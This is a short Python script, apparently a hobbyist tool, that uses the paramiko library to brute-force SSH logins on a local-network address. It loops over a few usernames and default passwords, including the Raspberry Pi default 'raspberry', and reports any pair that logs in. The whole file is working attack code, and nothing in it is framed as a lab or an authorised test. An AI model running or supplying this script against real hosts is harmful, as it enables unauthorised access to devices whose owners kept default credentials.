import paramiko
import sys

ip = '192.168.254.165'
passwords = ['12345678', 'raspberry', 'pi']
usernames = ['pi', 'isla', 'admin', 'root']

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

success = False
for u in usernames:
    for p in passwords:
        try:
            print(f"Trying {u}:{p}...")
            client.connect(ip, username=u, password=p, timeout=5)
            print(f"\nSUCCESS! Username: {u}, Password: {p}")
            success = True
            break
        except paramiko.AuthenticationException:
            pass
        except Exception as e:
            print(f"Error: {e}")
    if success: break

client.close()
